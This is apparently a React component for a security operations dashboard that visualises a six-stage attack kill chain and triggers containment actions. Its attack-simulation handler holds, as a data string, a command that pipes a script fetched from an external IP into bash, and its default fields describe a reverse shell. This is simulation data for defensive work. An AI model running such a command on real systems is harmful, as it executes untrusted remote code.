/**
 * AttackChainGraph.jsx — Interactive Cyber Kill-Chain Visualizer & Active SOAR Command Grid
 *
 * Enterprise-grade 6-stage Kill-Chain visualizer aligning with Lockheed Martin & MITRE ATT&CK:
 *  1. Recon & Ingress Origin (Attacker IP, Geo, ISP)
 *  2. Delivery & Weaponization (Exploit Payload, Protocol)
 *  3. Initial Foothold & Process Execution (Compromised PID, Shell Command)
 *  4. Privilege Escalation & Persistence (Sudo / Admin Elevation)
 *  5. Defense Evasion & Lateral Movement (Honeytoken & Decoy Canaries)
 *  6. C2 & Exfiltration Target (C2 Beaconing, Targeted Asset)
 *
 * Features:
 *  - Real-time binding with live Socket.IO threats & incidents
 *  - Interactive Node Inspector: Click any stage to inspect raw IoCs & forensics
 *  - One-Click SOAR Countermeasures: Block IP, Terminate PID, Isolate Host, Rearm Honeytoken
 *  - Audio FX integration with tactical audio feedback
 *  - Live Attack Simulator trigger
 */
import { useState, useEffect, useMemo } from 'react';
import {
  GitBranch,
  Shield,
  ShieldAlert,
  ShieldCheck,
  Zap,
  Lock,
  Skull,
  Server,
  Terminal,
  Database,
  ArrowRight,
  AlertTriangle,
  Flame,
  Radio,
  ExternalLink,
  ChevronRight,
  RotateCcw,
  Sparkles,
  Info,
  CheckCircle2,
  XCircle,
  Play,
} from 'lucide-react';
import toast from 'react-hot-toast';
import { defenseApi, incidentApi, threatApi } from '@/services/api';
import { useSocket } from '@/context/SocketContext';
import { tacticalAudio } from '@/utils/tacticalAudio';

export default function AttackChainGraph({ onOpenSimulator }) {
  const { lastFinding } = useSocket();
  const [incidents, setIncidents] = useState([]);
  const [selectedIncidentId, setSelectedIncidentId] = useState('live_feed');
  const [recentThreats, setRecentThreats] = useState([]);
  const [loading, setLoading] = useState(true);
  const [selectedNodeIndex, setSelectedNodeIndex] = useState(2); // Default to Process stage
  const [containmentStates, setContainmentStates] = useState({}); // campaignId -> { blocked: bool, killed: bool, isolated: bool, rearmed: bool }
  const [executingAction, setExecutingAction] = useState(null);
  const [simulating, setSimulating] = useState(false);

  // Fetch initial incidents and recent threats
  const fetchData = async () => {
    try {
      setLoading(true);
      const [incRes, threatRes] = await Promise.all([
        incidentApi.list({ limit: 8 }).catch(() => ({ data: {} })),
        threatApi.list({ limit: 10 }).catch(() => ({ data: {} })),
      ]);

      const incs = incRes.data?.data?.incidents || [];
      const thrs = threatRes.data?.data?.threats || [];

      setIncidents(incs);
      setRecentThreats(thrs);
    } catch {
      // Handled gracefully
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    fetchData();
  }, []);

  // Update dynamically on live socket finding
  useEffect(() => {
    if (!lastFinding) return;
    setRecentThreats((prev) => [lastFinding, ...prev.slice(0, 9)]);
    tacticalAudio.playRadarPing();
  }, [lastFinding]);

  // Derive dynamic kill-chain model based on the selected incident or live threat
  const activeChain = useMemo(() => {
    let sourceThreat = recentThreats[0] || {};
    let title = 'Live Endpoint Ingress Sequence';
    let severity = 'critical';

    if (selectedIncidentId !== 'live_feed') {
      const foundInc = incidents.find((i) => i._id === selectedIncidentId);
      if (foundInc) {
        title = foundInc.title || 'Correlated Incident Campaign';
        severity = foundInc.severity || 'high';
        sourceThreat = foundInc.threatIds?.[0] || sourceThreat;
      }
    } else if (recentThreats.length > 0) {
      sourceThreat = recentThreats[0];
      title = `Real-time Telemetry: ${sourceThreat.type || 'Host Alert'}`;
      severity = sourceThreat.severity || 'critical';
    }

    const attackerIp = sourceThreat.source?.ip || sourceThreat.geo?.ip || '185.220.101.45';
    const loc = sourceThreat.geo?.country
      ? `${sourceThreat.geo?.city ? sourceThreat.geo.city + ', ' : ''}${sourceThreat.geo.country}`
      : 'External Bulletproof Gateway (Tor/Proxy)';
    const isp = sourceThreat.geo?.isp || 'Cloud Hosting AS16276';
    const pid = sourceThreat.source?.pid || 4921;
    const processName = sourceThreat.source?.processName || (sourceThreat.type === 'honeytoken_breached' ? 'python3 -c import os' : 'bash -i');
    const technique = sourceThreat.mitreTechnique || 'T1059.004 (Command & Scripting)';
    const rawEvidence = Array.isArray(sourceThreat.evidence) && sourceThreat.evidence[0]
      ? sourceThreat.evidence[0]
      : sourceThreat.description || 'Remote reverse shell connection established via unauthorized socket';

    return {
      id: selectedIncidentId,
      title,
      severity,
      attackerIp,
      attackerLocation: loc,
      attackerIsp: isp,
      protocol: 'TCP / 443 ➔ 5050 (Reverse Payload)',
      pid,
      processName,
      technique,
      rawEvidence,
      targetAsset: 'Primary Sensor: soc-collector-01',
    };
  }, [selectedIncidentId, incidents, recentThreats]);

  const activeKey = activeChain.id;
  const state = containmentStates[activeKey] || {};

  // Build the 6 sequential stages of the attack kill-chain
  const stages = useMemo(() => [
    {
      index: 0,
      stageNumber: '01',
      name: 'Recon & Ingress',
      tactic: 'Reconnaissance / Initial Access',
      mitre: 'T1595 / T1190',
      status: state.blocked ? 'neutralized' : 'active',
      statusLabel: state.blocked ? 'BLOCKED' : 'MALICIOUS',
      title: activeChain.attackerIp,
      subtitle: activeChain.attackerLocation,
      detail: `Originator IP: ${activeChain.attackerIp} (${activeChain.attackerIsp}). External automated probe searching for vulnerable exposed services.`,
      actionLabel: state.blocked ? 'Firewall Drop Active ✓' : 'Block IP via SOAR',
      actionType: 'block_ip',
      target: activeChain.attackerIp,
      icon: Skull,
      color: 'red',
    },
    {
      index: 1,
      stageNumber: '02',
      name: 'Weaponization',
      tactic: 'Execution / Ingress Payload',
      mitre: 'T1203 / T1059',
      status: state.blocked ? 'mitigated' : 'active',
      statusLabel: state.blocked ? 'INTERCEPTED' : 'EXPLOITED',
      title: 'Malicious Web Vector',
      subtitle: activeChain.protocol,
      detail: `Injected command sequence encapsulated in HTTP POST. Technique: ${activeChain.technique}. WAF filter anomaly detected.`,
      actionLabel: null,
      icon: Server,
      color: 'amber',
    },
    {
      index: 2,
      stageNumber: '03',
      name: 'Host Execution',
      tactic: 'Execution',
      mitre: 'T1059.004',
      status: state.killed ? 'neutralized' : 'active',
      statusLabel: state.killed ? 'TERMINATED' : 'EXECUTING',
      title: `PID: ${activeChain.pid}`,
      subtitle: activeChain.processName,
      detail: `Local interpreter spawned child process: "${activeChain.processName}" (PID ${activeChain.pid}). High entropy execution string observed.`,
      actionLabel: state.killed ? 'Process Killed ✓' : 'SIGKILL Process Tree',
      actionType: 'kill_process',
      target: `PID: ${activeChain.pid}`,
      icon: Terminal,
      color: 'orange',
    },
    {
      index: 3,
      stageNumber: '04',
      name: 'Privilege Escalation',
      tactic: 'Privilege Escalation',
      mitre: 'T1548.003 (Sudo Rights)',
      status: state.killed ? 'prevented' : 'warning',
      statusLabel: state.killed ? 'BLOCKED' : 'ATTEMPTED',
      title: 'Elevated Tokens',
      subtitle: 'uid=0(root) gid=0(wheel)',
      detail: 'Adversary attempted sudo credential verification and PAM authentication bypass to attain administrator root privileges.',
      actionLabel: null,
      icon: ShieldAlert,
      color: 'purple',
    },
    {
      index: 4,
      stageNumber: '05',
      name: 'Defense Evasion',
      tactic: 'Credential Access',
      mitre: 'T1552.001 (Honeytoken Breach)',
      status: state.rearmed ? 'neutralized' : (state.isolated ? 'quarantined' : 'active'),
      statusLabel: state.rearmed ? 'DECOY RESET' : 'CANARY BREACHED',
      title: '~/.rakshak/canary.env',
      subtitle: 'AWS Decoy Honeytoken Accessed',
      detail: 'Unsolicited access to decoy AWS credentials detected. Honeytoken canary tripwire tripped! Legitimate software never touches this decoy file.',
      actionLabel: state.rearmed ? 'Canary Armed ✓' : 'Reset Decoy Honeytoken',
      actionType: 'rearm_honeytoken',
      target: '~/.rakshak/canary.env',
      icon: Zap,
      color: 'yellow',
    },
    {
      index: 5,
      stageNumber: '06',
      name: 'C2 & Exfiltration',
      tactic: 'Command & Control',
      mitre: 'T1071.001 (C2 Beacon)',
      status: state.isolated ? 'neutralized' : 'critical',
      statusLabel: state.isolated ? 'ISOLATED' : 'ACTIVE BEACON',
      title: activeChain.targetAsset,
      subtitle: 'Port 4444 C2 Beaconing',
      detail: `Outbound socket connection to external Command & Control beacon. Targeted asset: ${activeChain.targetAsset}.`,
      actionLabel: state.isolated ? 'Host Isolated ✓' : 'Isolate Host Network',
      actionType: 'isolate_host',
      target: activeChain.targetAsset,
      icon: Database,
      color: 'cyan',
    },
  ], [activeChain, state]);

  // Execute active countermeasure
  const handleContainment = async (actionType, target, label) => {
    try {
      setExecutingAction(actionType);
      const res = await defenseApi.contain({
        actionType: actionType === 'rearm_honeytoken' ? 'quarantine_file' : actionType,
        target,
        reason: `SOAR Kill-Chain Countermeasure: ${actionType} triggered from Dashboard`,
        incidentId: selectedIncidentId !== 'live_feed' ? selectedIncidentId : null,
        executedBy: 'analyst',
      });

      if (res.data?.status === 'success') {
        tacticalAudio.playNeutralized();
        toast.success(`🛡️ Countermeasure Enforced: ${label}`);
        setContainmentStates((prev) => ({
          ...prev,
          [activeKey]: {
            ...prev[activeKey],
            [actionType]: true,
          },
        }));
      }
    } catch (err) {
      toast.error(`Countermeasure failed: ${err.response?.data?.message || err.message}`);
    } finally {
      setExecutingAction(null);
    }
  };

  // Quick live attack simulation
  const handleQuickSimulate = async () => {
    try {
      setSimulating(true);
      tacticalAudio.playAlarm();
      toast('⚡ Injecting synthetic multi-stage exploit sequence...', { icon: '🚨' });

      await threatApi.simulate({
        type: 'command_injection',
        severity: 'critical',
        sourceIp: '185.220.101.' + Math.floor(Math.random() * 200 + 10),
        description: 'Simulated APT29 command injection & reverse shell beacon',
        payload: 'curl -s http://185.220.101.45/payload.sh | bash -i',
      });

      fetchData();
    } catch (err) {
      toast.error('Simulation failed: ' + err.message);
    } finally {
      setSimulating(false);
    }
  };

  // Status badge style helper
  const getStatusBadge = (status, label) => {
    switch (status) {
      case 'neutralized':
      case 'mitigated':
      case 'prevented':
      case 'quarantined':
        return 'bg-emerald-950/70 border-emerald-700/60 text-emerald-300';
      case 'warning':
        return 'bg-amber-950/70 border-amber-700/60 text-amber-300';
      case 'critical':
      case 'active':
      default:
        return 'bg-red-950/70 border-red-700/60 text-red-300 animate-pulse';
    }
  };

  const isNeutralized = state.killed && (state.blocked || state.isolated);
  const activeNode = stages[selectedNodeIndex] || stages[0];

  return (
    <div className="glass-card glow-border p-4 relative overflow-hidden">
      {/* ── Top Header & Threat Level ─────────────────────────────────── */}
      <div className="flex flex-wrap items-center justify-between gap-3 mb-4">
        <div className="flex items-center gap-2.5">
          <div className="p-2 rounded-lg bg-purple-950/60 border border-purple-800/40 text-purple-400 shadow-sm">
            <GitBranch className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <h3 className="text-sm font-semibold text-slate-100 tracking-wide font-mono">
                LIVE KILL-CHAIN ATTACK GRAPH
              </h3>
              {isNeutralized ? (
                <span className="flex items-center gap-1 text-[11px] font-mono text-emerald-400 bg-emerald-950/60 px-2.5 py-0.5 rounded-full border border-emerald-700/50">
                  <ShieldCheck className="w-3 h-3 text-emerald-400" />
                  CONTAINED & NEUTRALIZED
                </span>
              ) : (
                <span className="flex items-center gap-1 text-[11px] font-mono text-red-400 bg-red-950/60 px-2.5 py-0.5 rounded-full border border-red-800/60">
                  <Flame className="w-3 h-3 text-red-400 animate-pulse" />
                  ACTIVE THREAT CHAIN · STAGE 6 REACHED
                </span>
              )}
            </div>
            <p className="text-[11px] text-slate-400 mt-0.5">
              Lockheed Martin 6-stage MITRE ATT&CK progression with real-time SOAR countermeasures
            </p>
          </div>
        </div>

        {/* Action Controls & Feed Selector */}
        <div className="flex flex-wrap items-center gap-2">
          {/* Campaign Selector */}
          <div className="flex items-center gap-1.5 bg-surface-800/90 px-2.5 py-1 rounded-lg border border-surface-700/70 text-xs">
            <span className="text-slate-500 font-mono text-[11px]">View:</span>
            <select
              value={selectedIncidentId}
              onChange={(e) => setSelectedIncidentId(e.target.value)}
              className="bg-transparent text-slate-200 text-xs font-mono focus:outline-none cursor-pointer"
            >
              <option value="live_feed" className="bg-surface-900 text-cyan-300">
                ⚡ Real-time Telemetry Stream
              </option>
              {incidents.map((inc) => (
                <option key={inc._id} value={inc._id} className="bg-surface-900 text-slate-200">
                  {inc.title?.slice(0, 26)} ({inc.severity})
                </option>
              ))}
            </select>
          </div>

          {/* Quick Simulation Trigger */}
          <button
            onClick={handleQuickSimulate}
            disabled={simulating}
            className="px-2.5 py-1 text-xs font-mono font-medium rounded-lg bg-red-950/70 hover:bg-red-900/90 text-red-300 border border-red-800/50 transition-all flex items-center gap-1.5 shadow-sm"
            title="Inject simulated attack vector"
          >
            <Zap className={`w-3.5 h-3.5 text-red-400 ${simulating ? 'animate-spin' : ''}`} />
            <span>{simulating ? 'Injecting...' : 'Simulate Attack'}</span>
          </button>
        </div>
      </div>

      {/* ── 6-Stage Visual Kill-Chain Track ──────────────────────────── */}
      <div className="bg-[#020617] rounded-xl border border-surface-700/70 p-4 select-none relative overflow-x-auto shadow-inner">
        {/* Radar subtle grid pattern */}
        <div
          className="absolute inset-0 opacity-10 pointer-events-none"
          style={{
            backgroundImage: `radial-gradient(circle at 1px 1px, #38bdf8 1px, transparent 0)`,
            backgroundSize: '20px 20px',
          }}
        />

        <div className="min-w-[980px] flex items-stretch justify-between gap-2 relative z-10 py-1">
          {stages.map((st, i) => {
            const Icon = st.icon;
            const isSelected = selectedNodeIndex === i;
            const isStageNeutralized = st.status === 'neutralized' || st.status === 'mitigated' || st.status === 'prevented';

            return (
              <div key={st.index} className="flex-1 flex items-center">
                {/* Stage Node Box */}
                <div
                  onClick={() => setSelectedNodeIndex(i)}
                  className={`w-full rounded-xl border p-3 flex flex-col justify-between cursor-pointer transition-all duration-200 relative group ${
                    isSelected
                      ? 'ring-2 ring-cyan-500/80 shadow-lg shadow-cyan-950/50 scale-[1.02]'
                      : 'hover:border-slate-500/80 hover:bg-surface-800/60'
                  } ${
                    isStageNeutralized
                      ? 'bg-emerald-950/20 border-emerald-800/40 text-slate-300'
                      : 'bg-surface-900/90 border-surface-700/80 shadow-md'
                  }`}
                >
                  {/* Top Header */}
                  <div>
                    <div className="flex items-center justify-between mb-1.5">
                      <div className="flex items-center gap-1.5">
                        <span className="font-mono text-[10px] font-bold text-slate-500">
                          {st.stageNumber}
                        </span>
                        <span className="text-xs font-semibold text-slate-200 font-mono tracking-tight">
                          {st.name}
                        </span>
                      </div>
                      <span
                        className={`text-[9px] font-mono px-1.5 py-0.5 rounded border uppercase font-semibold ${getStatusBadge(
                          st.status,
                          st.statusLabel
                        )}`}
                      >
                        {st.statusLabel}
                      </span>
                    </div>

                    <p className="font-mono text-xs font-bold text-slate-100 truncate mt-1">
                      {st.title}
                    </p>
                    <p className="text-[11px] text-slate-400 truncate mt-0.5">
                      {st.subtitle}
                    </p>
                  </div>

                  {/* Bottom Countermeasure Trigger */}
                  <div className="mt-3 pt-2 border-t border-surface-800/60">
                    {st.actionLabel ? (
                      <button
                        onClick={(e) => {
                          e.stopPropagation();
                          handleContainment(st.actionType, st.target, st.actionLabel);
                        }}
                        disabled={state[st.actionType] || executingAction === st.actionType}
                        className={`w-full py-1 px-1.5 rounded text-[10px] font-mono font-medium flex items-center justify-center gap-1 transition-all ${
                          state[st.actionType]
                            ? 'bg-emerald-950/60 text-emerald-300 border border-emerald-700/50 cursor-default'
                            : 'bg-red-950/80 hover:bg-red-900 text-red-200 border border-red-700/70 hover:shadow-sm'
                        }`}
                      >
                        <Zap className="w-2.5 h-2.5" />
                        <span className="truncate">{st.actionLabel}</span>
                      </button>
                    ) : (
                      <div className="text-[10px] font-mono text-slate-500 text-center py-1 truncate">
                        {st.mitre}
                      </div>
                    )}
                  </div>
                </div>

                {/* Connecting Arrow between nodes */}
                {i < stages.length - 1 && (
                  <div className="px-1.5 flex flex-col items-center justify-center text-slate-600 shrink-0">
                    <ArrowRight
                      className={`w-3.5 h-3.5 transition-colors ${
                        isNeutralized
                          ? 'text-slate-700'
                          : i < 3
                          ? 'text-red-400 animate-pulse'
                          : 'text-amber-400'
                      }`}
                    />
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>

      {/* ── Interactive Stage Forensic Inspector ─────────────────────── */}
      <div className="mt-3 p-3.5 bg-surface-900/80 rounded-xl border border-surface-700/60 flex flex-col lg:flex-row items-start lg:items-center justify-between gap-4">
        <div className="flex items-start gap-3">
          <div className="p-2 rounded-lg bg-surface-800 border border-surface-700 text-cyan-400 shrink-0 mt-0.5">
            <Info className="w-4 h-4" />
          </div>
          <div>
            <div className="flex items-center gap-2">
              <span className="text-xs font-mono font-bold text-cyan-400 uppercase">
                STAGE {activeNode.stageNumber} INSPECTOR · {activeNode.name}
              </span>
              <span className="text-[10px] font-mono px-2 py-0.2 rounded bg-surface-800 border border-surface-700 text-slate-300">
                MITRE {activeNode.mitre}
              </span>
              <span className="text-[10px] font-mono text-slate-500">
                Tactic: {activeNode.tactic}
              </span>
            </div>
            <p className="text-xs text-slate-300 mt-1 font-sans">
              {activeNode.detail}
            </p>
          </div>
        </div>

        {/* Node Containment Dispatch Button */}
        {activeNode.actionLabel && !state[activeNode.actionType] && (
          <button
            onClick={() => handleContainment(activeNode.actionType, activeNode.target, activeNode.actionLabel)}
            disabled={executingAction === activeNode.actionType}
            className="shrink-0 px-3 py-1.5 text-xs font-mono font-bold rounded-lg bg-red-700 hover:bg-red-600 text-white flex items-center gap-1.5 shadow-md shadow-red-950/60 transition-all"
          >
            <Zap className="w-3.5 h-3.5" />
            <span>Enforce Countermeasure Now</span>
          </button>
        )}
      </div>
    </div>
  );
}
